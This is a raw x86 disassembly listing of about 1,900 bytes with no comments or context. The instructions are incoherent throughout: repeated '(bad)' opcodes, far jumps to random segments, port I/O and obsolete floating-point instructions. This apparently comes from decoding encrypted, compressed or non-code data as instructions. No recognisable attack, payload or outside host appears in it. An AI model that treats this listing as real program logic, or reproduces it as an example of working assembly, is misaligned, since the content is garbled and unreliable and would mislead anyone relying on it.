  4147fc:	sbb    al,0x6d
  4147fe:	mov    edx,DWORD PTR [edi+0x7dd666c4]
  414804:	pop    edi
  414805:	fwait
  414806:	rcl    BYTE PTR [ebx+eiz*2+0x4e],1
  41480a:	sahf   
  41480b:	cmp    edx,DWORD PTR [ecx-0x17]
  41480e:	data16 xlat BYTE PTR ds:[ebx]
  414810:	push   es
  414811:	imul   edx,DWORD PTR [esi+0x7447e486],0x373bc1ad
  41481b:	(bad)  
  41481c:	cmp    al,0xd9
  41481e:	rcl    DWORD PTR [ebx+0x4009ebd2],1
  414824:	pop    esi
  414825:	push   ebx
  414826:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414827:	test   al,0x6e
  414829:	pop    esp
  41482a:	shl    BYTE PTR [ecx+ecx*2],1
  41482d:	fiadd  WORD PTR [ebx*8-0x6069a863]
  414834:	lds    esi,FWORD PTR [eax-0x69]
  414837:	xchg   ebp,eax
  414838:	mov    dh,0x92
  41483a:	int3   
  41483b:	or     al,0x7f
  41483d:	xchg   esp,eax
  41483e:	imul   esi,DWORD PTR [ebp-0x1a506706],0x69
  414845:	aaa    
  414846:	add    al,0xc5
  414848:	push   eax
  414849:	addr16 aas 
  41484b:	std    
  41484c:	mov    eax,0x5b4189dd
  414851:	aam    0xc9
  414853:	xor    cl,BYTE PTR [ecx]
  414855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414856:	leave  
  414857:	int    0x95
  414859:	mov    ecx,0x4c7c3d84
  41485e:	out    0x84,al
  414860:	dec    esp
  414861:	jnp    0x414821
  414863:	xchg   esi,eax
  414864:	jmp    0x41482c
  414866:	push   ebx
  414867:	jl     0x4148e8
  414869:	jg     0x414835
  41486b:	fsub   DWORD PTR [ecx+ebp*4+0x3d9b6ed8]
  414872:	sbb    al,0xa7
  414874:	cmp    eax,0xb6c5f9c4
  414879:	rcl    DWORD PTR [edx],1
  41487b:	idiv   BYTE PTR [ebx-0x541aa7d8]
  414881:	sbb    edx,DWORD PTR [ebp+0x60]
  414884:	cmp    bl,BYTE PTR gs:[edx-0x63]
  414888:	push   0x2
  41488a:	push   eax
  41488b:	cmp    al,0xed
  41488d:	rcr    BYTE PTR [ecx+0x6977f101],0x22
  414894:	adc    ebp,DWORD PTR [ecx-0x65]
  414897:	inc    edi
  414898:	and    al,0x5d
  41489a:	add    DWORD PTR [eax],0x7f83c13e
  4148a0:	outs   dx,DWORD PTR ds:[esi]
  4148a1:	dec    ax
  4148a3:	or     ebp,DWORD PTR [ebx+eax*8+0x4d]
  4148a7:	xor    ecx,ecx
  4148a9:	int    0x83
  4148ab:	out    0xf8,eax
  4148ad:	jmp    FWORD PTR [ecx+0x3940066d]
  4148b3:	lods   eax,DWORD PTR ds:[esi]
  4148b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148b5:	ror    BYTE PTR [esi+0x17],0xe0
  4148b9:	cld    
  4148ba:	pop    edx
  4148bb:	push   esi
  4148bc:	out    0xd,eax
  4148be:	dec    ebp
  4148bf:	lods   eax,DWORD PTR ds:[esi]
  4148c0:	ins    DWORD PTR es:[edi],dx
  4148c1:	dec    esp
  4148c2:	jno    0x4148eb
  4148c4:	push   0x11a7bc65
  4148c9:	jno    0x414921
  4148cb:	pop    si
  4148cd:	aad    0xe2
  4148cf:	loop   0x4148dd
  4148d1:	retf   
  4148d2:	sbb    BYTE PTR [ebp-0x48],0xd9
  4148d6:	in     eax,dx
  4148d7:	fucomp st(2)
  4148d9:	iret   
  4148da:	fld    TBYTE PTR [ebx-0x6]
  4148dd:	inc    ebp
  4148de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148df:	pop    es
  4148e0:	xchg   BYTE PTR [ebx+0xd760053],bl
  4148e6:	test   ebp,esi
  4148e8:	lods   al,BYTE PTR ds:[esi]
  4148e9:	push   edi
  4148ea:	scas   eax,DWORD PTR es:[edi]
  4148eb:	das    
  4148ec:	jecxz  0x414915
  4148ee:	mov    ch,0x99
  4148f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148f1:	and    edi,0x9f1526a
  4148f7:	and    eax,0x33531443
  4148fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148fd:	jmp    0x7b2d:0xe0b5b09f
  414904:	das    
  414905:	sbb    al,0x67
  414907:	mov    dl,0x91
  414909:	shr    DWORD PTR [edi],0xf
  41490c:	lock xchg esi,eax
  41490e:	mov    esi,0xfe693658
  414913:	shl    DWORD PTR [edx+0x52],1
  414916:	dec    esi
  414917:	jo     0x414995
  414919:	cmc    
  41491a:	ss jmp 0x47fb:0x4fb295c1
  414922:	mov    dh,0xb2
  414924:	mov    al,0x29
  414926:	and    edx,DWORD PTR [ecx]
  414928:	loope  0x41490e
  41492a:	jle    0x414962
  41492c:	xor    BYTE PTR [edi+0x12],bh
  41492f:	out    dx,eax
  414930:	adc    bh,ch
  414932:	xchg   edi,eax
  414933:	out    dx,eax
  414934:	adc    al,0xb7
  414936:	lea    esp,[edx+edx*8-0x8]
  41493a:	pop    eax
  41493b:	mov    edx,0xd990a2fd
  414940:	or     dh,bl
  414942:	and    bl,BYTE PTR [ebx-0x20]
  414945:	call   0x8578:0x936505b3
  41494c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41494d:	fcom   DWORD PTR [ecx+0x21bbfe6b]
  414953:	push   cs
  414954:	cdq    
  414955:	dec    edx
  414956:	popf   
  414957:	loope  0x4149b6
  414959:	daa    
  41495a:	aaa    
  41495b:	dec    eax
  41495c:	imul   eax,ebp,0xffffffa3
  41495f:	jmp    0x61d2:0x66c3fcaf
  414966:	call   0xf6f6:0x39a19270
  41496d:	fistp  WORD PTR [esi+0x36f5a65e]
  414973:	ins    DWORD PTR es:[edi],dx
  414974:	mov    ch,0x2
  414976:	jle    0x4148fe
  414978:	push   0xfffffffe
  41497a:	cmp    DWORD PTR [edx+0x3f],ebp
  41497d:	in     al,0x81
  41497f:	or     ebx,DWORD PTR [ebx-0x50838ea2]
  414985:	jbe    0x41499c
  414987:	mov    ds,WORD PTR [ecx-0x75]
  41498a:	mov    ch,0x63
  41498c:	mov    ebx,0xd3ea7cd0
  414991:	imul   edi,DWORD PTR [edi-0x72],0x70
  414995:	and    al,0x2d
  414997:	aad    0x28
  414999:	xchg   BYTE PTR [ebp+0x6f],bh
  41499c:	jmp    0x230ddcac
  4149a1:	fild   WORD PTR [esi-0x76]
  4149a4:	or     BYTE PTR [edi],dh
  4149a6:	ret    
  4149a7:	push   0xffffffe7
  4149a9:	xchg   ebx,eax
  4149aa:	sub    al,0x50
  4149ac:	and    al,0x24
  4149ae:	mov    bl,0x81
  4149b0:	dec    esi
  4149b1:	adc    DWORD PTR [esi-0x1d],ebp
  4149b4:	clc    
  4149b5:	ds adc al,0x64
  4149b8:	retf   
  4149b9:	mov    esi,DWORD PTR [edx]
  4149bb:	xor    edx,edx
  4149bd:	ret    0x54aa
  4149c0:	leave  
  4149c1:	add    bl,cl
  4149c3:	fldenv [edi]
  4149c5:	cli    
  4149c6:	and    DWORD PTR [ecx-0x73812b08],ebx
  4149cc:	xchg   BYTE PTR [esi-0x1a7ff433],cl
  4149d2:	pop    ss
  4149d3:	outs   dx,DWORD PTR ds:[esi]
  4149d4:	push   edi
  4149d5:	or     DWORD PTR [esi+ebx*4],ebx
  4149d8:	or     eax,0xc081a0a3
  4149dd:	test   BYTE PTR [esi+ebx*1+0x35],ch
  4149e1:	and    DWORD PTR [ebp-0x2c],0xffffffe5
  4149e5:	mov    dh,0xbe
  4149e7:	test   DWORD PTR [ebx+0x51],esi
  4149ea:	jmp    0x6d4bc914
  4149ef:	jo     0x4149e9
  4149f1:	repnz mov bl,0x3a
  4149f4:	rcr    esp,cl
  4149f6:	daa    
  4149f7:	pop    esp
  4149f8:	cmp    BYTE PTR [esp+ebp*8-0x18055cca],0x10
  414a00:	pop    ebp
  414a01:	xchg   BYTE PTR [esp+eiz*2],dh
  414a04:	sub    DWORD PTR [ebx+0x3577101],0x1a78ccc9
  414a0e:	ret    
  414a0f:	add    edi,DWORD PTR [edi+0x6a]
  414a12:	aad    0x5c
  414a14:	adc    DWORD PTR [eax-0x5b],0xd71039f1
  414a1b:	clc    
  414a1c:	add    BYTE PTR cs:[edi-0x6f],bh
  414a20:	neg    ah
  414a22:	mov    cl,0xc2
  414a24:	add    eax,0x1a37589a
  414a29:	or     eax,0xa595763f
  414a2e:	sbb    dh,BYTE PTR [ebx+edx*1-0x59]
  414a32:	(bad)  
  414a33:	inc    edx
  414a34:	cmc    
  414a35:	sbb    eax,0x53444480
  414a3a:	gs mov ebp,0x2de162b0
  414a40:	pop    ebx
  414a41:	enter  0xb5d,0xee
  414a45:	cmp    BYTE PTR ds:0xfa19584e,dl
  414a4b:	cmc    
  414a4c:	scas   al,BYTE PTR es:[edi]
  414a4d:	xchg   ecx,eax
  414a4e:	xchg   BYTE PTR [edi],dh
  414a50:	lock arpl cx,cx
  414a53:	(bad)  
  414a54:	push   edi
  414a55:	xchg   DWORD PTR [eax-0x32],ecx
  414a58:	xor    eax,0x58013fcb
  414a5d:	mov    edi,0x4c5b48f0
  414a62:	call   0x2e5869ff
  414a67:	xchg   BYTE PTR [edi],bl
  414a69:	pop    ecx
  414a6a:	fcmovbe st,st(5)
  414a6c:	mov    ebp,0x80e8a6d1
  414a71:	sar    BYTE PTR [eax+0x75],0xc7
  414a75:	push   cs
  414a76:	mov    esi,0xb9dc35c
  414a7b:	ja     0x414abb
  414a7d:	mov    eax,ds:0xadc5571
  414a82:	add    ecx,esi
  414a84:	ds iret 
  414a86:	int3   
  414a87:	add    BYTE PTR [edi],dh
  414a89:	in     al,dx
  414a8a:	adc    al,0x2e
  414a8c:	imul   edx,DWORD PTR [eax+ebp*4+0x351e7185],0x35
  414a94:	test   BYTE PTR [ecx-0x44],dh
  414a97:	dec    eax
  414a98:	pop    es
  414a99:	mov    dh,0xf5
  414a9b:	cld    
  414a9c:	adc    ebp,DWORD PTR [edi-0x51]
  414a9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414aa0:	pop    esi
  414aa1:	cmp    ebx,DWORD PTR [bp+si+0x5766]
  414aa6:	pop    edx
  414aa7:	ins    DWORD PTR es:[edi],dx
  414aa8:	dec    ebp
  414aa9:	sub    cl,bl
  414aab:	sti    
  414aac:	add    DWORD PTR ds:0xbb24cbf3,esi
  414ab2:	or     al,0xe7
  414ab4:	sbb    eax,0x75304206
  414ab9:	sub    BYTE PTR [ecx+0x1b],dl
  414abc:	push   eax
  414abd:	int    0xd4
  414abf:	mov    eax,ds:0xfa77cb2b
  414ac4:	xchg   al,cl
  414ac6:	or     al,0x5
  414ac8:	mov    bh,0x52
  414aca:	stc    
  414acb:	mov    ah,0x87
  414acd:	xchg   edx,eax
  414ace:	in     eax,0xf3
  414ad0:	daa    
  414ad1:	dec    esi
  414ad2:	ins    BYTE PTR es:[edi],dx
  414ad3:	jbe    0x414a7e
  414ad5:	mov    BYTE PTR [esi+0x371958cd],ah
  414adb:	shl    BYTE PTR [eax+0x1],cl
  414ade:	pop    edi
  414adf:	xchg   ebp,eax
  414ae0:	sbb    dl,BYTE PTR [ebp-0x14dd95ec]
  414ae6:	sub    al,BYTE PTR [esi-0x51]
  414ae9:	cli    
  414aea:	out    dx,eax
  414aeb:	idiv   BYTE PTR [esi]
  414aed:	stos   BYTE PTR es:[edi],al
  414aee:	adc    edx,DWORD PTR [edi]
  414af0:	dec    ebx
  414af1:	fwait
  414af2:	jp     0x414acc
  414af4:	sub    BYTE PTR [edi+0x2d],dh
  414af7:	mov    dh,0x70
  414af9:	or     ebx,ebx
  414afb:	mov    al,0x3d
  414afd:	(bad)  
  414afe:	pop    edi
  414aff:	dec    ebp
  414b00:	push   eax
  414b01:	das    
  414b02:	vhaddpd xmm1,xmm7,XMMWORD PTR [edi+0x516c722a]
  414b0a:	bound  esi,QWORD PTR [ebx-0x6aaf68a6]
  414b10:	outs   dx,BYTE PTR ds:[esi]
  414b11:	dec    DWORD PTR [ebx+esi*8]
  414b14:	rcl    DWORD PTR [esi+0x71],1
  414b17:	pop    ss
  414b18:	sbb    DWORD PTR [ecx],ebp
  414b1a:	adc    edx,DWORD PTR [esi-0x47af991c]
  414b20:	xor    ebp,ebp
  414b22:	test   eax,0x915dfa4b
  414b27:	(bad)  
  414b28:	test   al,0xd8
  414b2a:	in     eax,dx
  414b2b:	inc    ebx
  414b2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b2d:	jl     0x414b79
  414b2f:	aam    0xf3
  414b31:	inc    eax
  414b32:	adc    DWORD PTR [edx+0x34],ebx
  414b35:	push   es
  414b36:	adc    eax,0x42bb3ec
  414b3b:	cmp    ch,BYTE PTR [edi]
  414b3d:	mov    ds:0x2faa5cc9,eax
  414b42:	and    al,0x15
  414b44:	popa   
  414b45:	push   0x42
  414b47:	into   
  414b48:	test   al,0xb1
  414b4a:	int3   
  414b4b:	cmp    eax,0x10fe8fce
  414b50:	jmp    0x7c05d1cf
  414b55:	ja     0x414bb3
  414b57:	push   ebp
  414b58:	mov    esp,0x1cc6394b
  414b5d:	idiv   DWORD PTR [esp+eiz*4-0x5d]
  414b61:	test   BYTE PTR [ecx],0x99
  414b64:	hlt    
  414b65:	lods   eax,DWORD PTR ds:[esi]
  414b66:	mov    ds:0xc43cfda0,al
  414b6b:	nop
  414b6c:	bound  esp,QWORD PTR [esp+edi*4]
  414b6f:	dec    ebx
  414b70:	mov    ebx,0x66829843
  414b75:	mov    WORD PTR [edi],fs
  414b77:	jo     0x414b5f
  414b79:	sub    edx,esp
  414b7b:	push   es
  414b7c:	fwait
  414b7d:	imul   esp,DWORD PTR [ebp+0x6bd1812],0xf07023d
  414b87:	or     BYTE PTR [eax+0x29255603],bh
  414b8d:	jle    0x414bee
  414b8f:	cmp    DWORD PTR [eiz*4-0x1a555572],0x49920816
  414b9a:	ins    BYTE PTR es:[edi],dx
  414b9b:	inc    edx
  414b9c:	dec    edi
  414b9d:	psrad  mm2,QWORD PTR [ebx]
  414ba0:	js     0x414bac
  414ba2:	xchg   DWORD PTR [ecx+edi*8+0x5],ebp
  414ba6:	jg     0x414bd9
  414ba8:	test   ebx,ebp
  414baa:	test   eax,0x54fc5932
  414baf:	pop    esp
  414bb0:	(bad)
  414bb3:	mov    ah,0x29
  414bb5:	adc    BYTE PTR ds:0x3453cff6,bh
  414bbb:	stos   BYTE PTR es:[edi],al
  414bbc:	dec    edi
  414bbd:	repz jae 0x414ba5
  414bc0:	int    0x32
  414bc2:	js     0x414ba7
  414bc4:	je     0x414b71
  414bc6:	loopne 0x414bed
  414bc8:	add    al,dl
  414bca:	and    BYTE PTR [eax],0x39
  414bcd:	xchg   esp,eax
  414bce:	cwde   
  414bcf:	aam    0x4c
  414bd1:	(bad)  
  414bd2:	sbb    al,0x9c
  414bd4:	or     edx,ebx
  414bd6:	lods   al,BYTE PTR ds:[esi]
  414bd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bd8:	(bad)  
  414bd9:	div    BYTE PTR [edi]
  414bdb:	retf   
  414bdc:	push   ebx
  414bdd:	ja     0x414c53
  414bdf:	sbb    cl,al
  414be1:	push   cs
  414be2:	sahf   
  414be3:	shrd   DWORD PTR [edx],ecx,cl
  414be6:	test   al,0x91
  414be8:	or     BYTE PTR [esp+ecx*2+0x13],dh
  414bec:	pop    edx
  414bed:	xlat   BYTE PTR ds:[ebx]
  414bee:	fwait
  414bef:	sub    DWORD PTR [ecx+0x617de85],esp
  414bf5:	inc    esp
  414bf6:	mov    cl,BYTE PTR ds:0xb06c294a
  414bfc:	jns    0x414c6f
  414bfe:	dec    ebp
  414bff:	push   ebp
  414c00:	or     al,0x1c
  414c02:	dec    ebp
  414c03:	ja     0x414bcc
  414c05:	test   cl,ah
  414c07:	pop    es
  414c08:	mov    ebp,0xab319d37
  414c0d:	or     dh,cl
  414c0f:	add    eax,0xe6c75e8d
  414c14:	xchg   edi,eax
  414c15:	or     eax,0x60691d58
  414c1a:	test   al,0xef
  414c1c:	mov    dl,0xe0
  414c1e:	out    dx,al
  414c1f:	jle    0x414c0e
  414c21:	and    al,0x45
  414c23:	iret   
  414c24:	add    eax,0x1a6fae6b
  414c29:	shl    DWORD PTR [ebp+0x7c],0x54
  414c2d:	jge    0x414bf7
  414c2f:	push   esi
  414c30:	push   ebx
  414c31:	lods   eax,DWORD PTR ds:[esi]
  414c32:	es xchg ebx,eax
  414c34:	sbb    DWORD PTR [edi],edi
  414c36:	js     0x414c62
  414c38:	lods   al,BYTE PTR ds:[esi]
  414c39:	lea    ebx,[ecx]
  414c3b:	test   al,0xae
  414c3d:	hlt    
  414c3e:	hlt    
  414c3f:	mov    eax,0x14cbe723
  414c44:	jbe    0x414cae
  414c46:	sbb    edx,ebx
  414c48:	(bad)  
  414c4a:	(bad)  
  414c4b:	jns    0x414c53
  414c4d:	in     eax,0xa9
  414c4f:	ror    eax,cl
  414c51:	loope  0x414c04
  414c53:	lahf   
  414c54:	jne    0x414cbc
  414c56:	lock pop ebp
  414c58:	scas   al,BYTE PTR es:[edi]
  414c59:	stc    
  414c5a:	out    0x8a,eax
  414c5c:	pop    edi
  414c5d:	arpl   WORD PTR [ebp-0x64d7bac5],ax
  414c63:	test   BYTE PTR [edi+eiz*8-0x67],bl
  414c67:	cmp    DWORD PTR [bp+si+0x4413],0xffffffdc
  414c6d:	and    dl,al
  414c6f:	mov    ebx,0x942d865e
  414c74:	xor    BYTE PTR [edx],al
  414c76:	jge    0x414bfd
  414c78:	rol    BYTE PTR [ebp+0x70],0x3a
  414c7c:	imul   ebx,DWORD PTR [ebx],0xd367b770
  414c82:	lods   al,BYTE PTR ds:[esi]
  414c83:	out    dx,al
  414c84:	xchg   ecx,eax
  414c85:	push   ebx
  414c86:	test   DWORD PTR [edx-0x61d0b503],0x2a44b577
  414c90:	xchg   edi,eax
  414c91:	xchg   ecx,eax
  414c92:	jne    0x414c23
  414c94:	sbb    al,0xb9
  414c96:	add    BYTE PTR [ecx-0x62],ch
  414c99:	and    al,BYTE PTR [esi+eiz*4]
  414c9c:	rcl    BYTE PTR [edx+0x5a1976b0],0x70
  414ca3:	add    al,0x35
  414ca5:	pop    ebx
  414ca6:	sub    eax,0x50861b31
  414cab:	add    al,0x6f
  414cad:	rol    cl,cl
  414caf:	les    esi,FWORD PTR [esi]
  414cb1:	mov    dl,0xfc
  414cb3:	popa   
  414cb4:	cmp    al,0x78
  414cb6:	ja     0x414c71
  414cb8:	call   0xdeca572d
  414cbd:	cwde   
  414cbe:	test   al,0xad
  414cc0:	mov    BYTE PTR [ebx+0x45],bh
  414cc3:	sub    esi,DWORD PTR [ebp+0x44]
  414cc6:	push   ecx
  414cc7:	add    dh,BYTE PTR [edi+0x21858cf7]
  414ccd:	mov    edx,0xd1b82c00
  414cd2:	ror    DWORD PTR [ebx-0x2b],cl
  414cd5:	iret   
  414cd6:	retf   
  414cd7:	imul   esi,DWORD PTR [ebx+0x34d71e30],0xfffffffe
  414cde:	out    dx,eax
  414cdf:	xchg   esi,eax
  414ce0:	je     0x414ccc
  414ce2:	xlat   BYTE PTR ds:[ebx]
  414ce3:	lss    edi,FWORD PTR [ecx+ebp*8+0xb]
  414ce8:	outs   dx,BYTE PTR ds:[esi]
  414ce9:	xor    ebp,DWORD PTR [ebp-0x5]
  414cec:	call   0x38ab:0xd392b92a
  414cf3:	sbb    al,0x9b
  414cf5:	or     ecx,edi
  414cf7:	mov    bl,0x69
  414cf9:	std    
  414cfa:	popf   
  414cfb:	and    dl,BYTE PTR [esi+esi*2+0x45]
  414cff:	mov    esi,0xe06c07a2
  414d04:	test   eax,0x17672079
  414d09:	fwait
  414d0a:	jmp    0x414cca
  414d0c:	in     eax,0xab
  414d0e:	mov    ds:0x7c20994b,al
  414d13:	loopne 0x414d5a
  414d15:	xlat   BYTE PTR ds:[ebx]
  414d16:	je     0x414cb4
  414d18:	or     ebx,DWORD PTR [edi+0x6cfa87cf]
  414d1e:	xchg   esi,eax
  414d1f:	push   ecx
  414d20:	sub    eax,0x93c1998
  414d25:	stos   BYTE PTR es:[edi],al
  414d26:	inc    esi
  414d27:	add    eax,0xa5605228
  414d2c:	std    
  414d2d:	xchg   ebp,eax
  414d2e:	(bad)  
  414d2f:	and    DWORD PTR ds:0xff983cc4,esp
  414d35:	repz (bad) 
  414d37:	mov    cl,0x51
  414d39:	sbb    al,ah
  414d3b:	or     al,BYTE PTR [edx]
  414d3d:	mov    DWORD PTR [edx+0x63ed2ad8],esi
  414d43:	enter  0x6e87,0x27
  414d47:	mov    DWORD PTR [eax+0x7cc15790],edx
  414d4d:	stos   DWORD PTR es:[edi],eax
  414d4e:	pop    esi
  414d4f:	ja     0x414d8d
  414d51:	xor    eax,0xc88cc6c1
  414d56:	jo     0x414da6
  414d58:	retf   0x72ff
  414d5b:	call   0x1703f317
  414d60:	add    edx,edi
  414d62:	popa   
  414d63:	ins    BYTE PTR es:[edi],dx
  414d64:	mov    bl,0x5a
  414d66:	outs   dx,DWORD PTR ds:[esi]
  414d67:	xor    BYTE PTR fs:[ebx],al
  414d6a:	js     0x414d72
  414d6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d6d:	test   DWORD PTR [edx],ebp
  414d6f:	and    eax,0x66130240
  414d74:	jmp    0x414d0b
  414d76:	add    DWORD PTR [ebx],esp
  414d78:	out    0xb,eax
  414d7a:	jo     0x414d95
  414d7c:	push   0xd7765313
  414d81:	jnp    0x414d84
  414d83:	xchg   DWORD PTR [ebp-0x42],edx
  414d86:	and    DWORD PTR [ebp-0x1e],0x2d
  414d8a:	jp     0x414d22
  414d8c:	mov    cl,0x38
  414d8e:	repnz add al,0xbe
  414d91:	cli    
  414d92:	inc    esi
  414d93:	push   esi
  414d94:	pop    ss
  414d95:	xor    BYTE PTR [edx],al
  414d97:	sbb    bl,BYTE PTR [esi]
  414d99:	mov    ss,WORD PTR [ebp-0x76]
  414d9c:	sbb    al,0x92
  414d9e:	out    0x8f,eax
  414da0:	inc    edi
  414da1:	fidiv  DWORD PTR [ecx+0x2ec4b42c]
  414da7:	(bad)  
  414da8:	pop    esi
  414da9:	mov    al,ds:0xfab869f1
  414dae:	jae    0x414d69
  414db0:	test   DWORD PTR [ebx],esi
  414db2:	data16 ror BYTE PTR [ebx],1
  414db5:	lods   eax,DWORD PTR ds:[esi]
  414db6:	push   cs
  414db7:	ret    
  414db8:	mov    dh,0x11
  414dba:	jmp    0x414d40
  414dbc:	add    eax,0x637770fc
  414dc1:	inc    esi
  414dc2:	sbb    DWORD PTR [edx-0x2c1f56a0],ecx
  414dc8:	imul   esp,DWORD PTR [edx+0x4d],0x7f
  414dcc:	les    edi,FWORD PTR [edi]
  414dce:	(bad)  
  414dcf:	jno    0x414de7
  414dd1:	xchg   DWORD PTR [edi-0x47],ecx
  414dd4:	inc    ecx
  414dd5:	pop    esi
  414dd6:	icebp  
  414dd7:	dec    esi
  414dd8:	push   edx
  414dd9:	int3   
  414dda:	jg     0x414dd2
  414ddc:	scas   eax,DWORD PTR es:[edi]
  414ddd:	cmp    BYTE PTR [ecx+0x83b50f],dl
  414de3:	cld    
  414de4:	aad    0xf
  414de6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414de7:	fild   QWORD PTR [ebp-0x24]
  414dea:	addr16 sub eax,0x3def7132
  414df0:	xchg   esi,eax
  414df1:	inc    eax
  414df2:	mov    dh,0x6a
  414df4:	fst    DWORD PTR cs:[ebp+0x5364ec6c]
  414dfb:	jne    0x414df5
  414dfd:	jae    0x414dc3
  414dff:	and    DWORD PTR ds:0x75a1ff65,ebx
  414e05:	pop    ebx
  414e06:	push   es
  414e07:	pop    ecx
  414e08:	in     al,dx
  414e09:	fneni(8087 only) 
  414e0b:	xor    BYTE PTR [esi+0x31],dl
  414e0e:	mov    es,WORD PTR [edx+0x49]
  414e11:	pushf  
  414e12:	cs inc esi
  414e14:	dec    ebp
  414e15:	push   0x35b4c6ed
  414e1a:	mov    ah,0xd0
  414e1c:	xchg   ecx,eax
  414e1d:	sub    bh,BYTE PTR ds:[esi-0x58]
  414e21:	xchg   esi,eax
  414e22:	daa    
  414e23:	shr    DWORD PTR [ebx],cl
  414e25:	mov    DWORD PTR [edi],edx
  414e27:	xchg   esp,eax
  414e28:	cmp    bh,BYTE PTR gs:[esi]
  414e2b:	pop    ebx
  414e2c:	mov    ebp,0x1e1874fd
  414e31:	or     BYTE PTR fs:[edi+0x6],dl
  414e35:	pop    es
  414e36:	pop    esi
  414e37:	cli    
  414e38:	pop    ebx
  414e39:	(bad)  
  414e3a:	jo     0x414e71
  414e3c:	cld    
  414e3d:	inc    ecx
  414e3e:	push   es
  414e3f:	adc    DWORD PTR [ebx-0x2e],eax
  414e42:	mov    edx,0xdf173d2a
  414e47:	add    al,0x7b
  414e49:	xchg   BYTE PTR [eax],cl
  414e4b:	push   ecx
  414e4c:	jecxz  0x414eb8
  414e4e:	aas    
  414e4f:	mov    eax,0x9d07c238
  414e54:	jecxz  0x414e9c
  414e56:	jae    0x414e3f
  414e58:	fst    QWORD PTR [esi]
  414e5a:	call   0x6f8d65d1
  414e5f:	push   edx
  414e60:	inc    edi
  414e61:	xchg   ebp,eax
  414e62:	cmc    
  414e63:	pushf  
  414e64:	dec    edx
  414e65:	jmp    0x2b9ac45e
  414e6a:	push   edx
  414e6b:	das    
  414e6c:	cmp    DWORD PTR [esi+0x4b],0xecac5736
  414e73:	inc    eax
  414e74:	int3   
  414e75:	je     0x414e4f
  414e77:	retf   0xfe97
  414e7a:	dec    esp
  414e7b:	mov    ecx,0xad3023f2
  414e80:	inc    eax
  414e81:	push   edx
  414e82:	jno    0x414e89
  414e84:	sub    esp,DWORD PTR [ebp-0x1c]
  414e87:	pop    ebp
  414e88:	sqrtps xmm0,XMMWORD PTR cs:[esi]
  414e8c:	ficomp DWORD PTR [edx-0x70]
  414e8f:	loop   0x414f10
  414e91:	xlat   BYTE PTR ds:[ebx]
  414e92:	fld    QWORD PTR [ebp+0x6a4d0ca1]
  414e98:	jg     0x414e5b
  414e9a:	cmp    eax,0x7410bab3
  414ea0:	sahf   
  414ea1:	sahf   
  414ea2:	adc    eax,0xbb738421
  414ea7:	aad    0x82
  414ea9:	inc    ebx
  414eaa:	jg     0x414e96
  414eac:	mov    esp,0xcff7f2d5
  414eb1:	les    esp,FWORD PTR [ebx-0x416b00f6]
  414eb7:	mov    bh,0x7
  414eb9:	and    ch,dl
  414ebb:	jno    0x414eb3
  414ebd:	mov    ds:0xdaa26a5e,al
  414ec2:	add    ah,BYTE PTR [eax-0x9081c3d]
  414ec8:	ds pop ebx
  414eca:	cmp    eax,0x92592c83
  414ecf:	jg     0x414e63
  414ed1:	imul   ebp,DWORD PTR [ebx-0x10],0xffffffc9
  414ed5:	or     al,0xda
  414ed7:	jle    0x414edd
  414ed9:	ror    BYTE PTR [eax+0x24],1
  414edc:	sub    DWORD PTR [edi-0x6d],ebx
  414edf:	or     BYTE PTR gs:[eax+eiz*8],dl
  414ee3:	aam    0xa3
  414ee5:	sub    ch,0x18
  414ee8:	test   DWORD PTR [esi+ebp*2],0xd9da38d1
  414eef:	call   0x23a0b2ed
  414ef4:	mov    bl,0x3c
  414ef6:	cmp    ebp,ecx
  414ef8:	stc    
  414ef9:	call   0xd488:0x977ecfea
  414f00:	cmp    ch,BYTE PTR [ebx+0x41]
  414f03:	add    ah,BYTE PTR [edi+0x66]
  414f06:	push   ebx
  414f07:	clc    
  414f08:	jns    0x414f6c
  414f0a:	retf   0x91dc
  414f0d:	pusha  
  414f0e:	xchg   ecx,eax
  414f0f:	xlat   BYTE PTR ds:[ebx]
  414f10:	mov    cl,dl
  414f12:	test   al,0x20
  414f14:	sbb    bl,cl
  414f16:	ins    DWORD PTR es:[edi],dx
  414f17:	sbb    ebp,ebp
  414f19:	imul   ebp,DWORD PTR [edi+ecx*2+0x11e63f35],0x3fceb303
  414f24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f25:	call   0x4328:0xfc78083c
  414f2c:	adc    eax,0x361e68bf
  414f31:	or     BYTE PTR [ebp-0x34],al
  414f34:	in     eax,0x1b
  414f36:	mov    bl,0xb6
  414f38:	sub    DWORD PTR [ecx+0x61e5c900],0x2980570
  414f42:	cmc    
  414f43:	or     al,0x94
  414f45:	push   ss
  414f46:	pop    esp
  414f47:	push   0xffffff99
  414f49:	hlt    
  414f4a:	sbb    DWORD PTR [eax+0x27],0x23
  414f4e:	xchg   ebx,eax
  414f4f:	fdiv   DWORD PTR [ebx]
  414f51:	and    al,BYTE PTR [eax]
  414f53:	xlat   BYTE PTR ds:[ebx]
  414f54:	push   ebp
  414f55:	jne    0x414f91
  414f57:	std    
  414f58:	sar    DWORD PTR [eax],0x0
  414f5b:	ffree  st(4)
  414f5d:	out    0xa9,al
  414f5f:	push   edi
  414f60:	pop    ebp
  414f61:	cli    
  414f62:	into   
  414f63:	popf   
  414f64:	lds    ebx,FWORD PTR [edi]
  414f66:	jnp    0x414f92
  414f68:	push   0xffffffc8
  414f6a:	push   esp
  414f6b:	clc    
  414f6c:	jbe    0x414f1e
  414f6e:	pop    ecx
  414f6f:	mov    cl,0x79
  414f71:	mov    ebx,0x1052498e
  414f76:	push   0x1bd2434f
  414f7b:	fisubr WORD PTR [esi+0x4384bd12]
  414f81:	inc    esi
  414f82:	lods   eax,DWORD PTR ds:[esi]
  414f83:	ja     0x414f4e
  414f85:	mov    esp,edi
  414f87:	test   eax,0xaab15b10
  414f8c:	xchg   ecx,eax
  414f8d:	sub    BYTE PTR [edi],dl
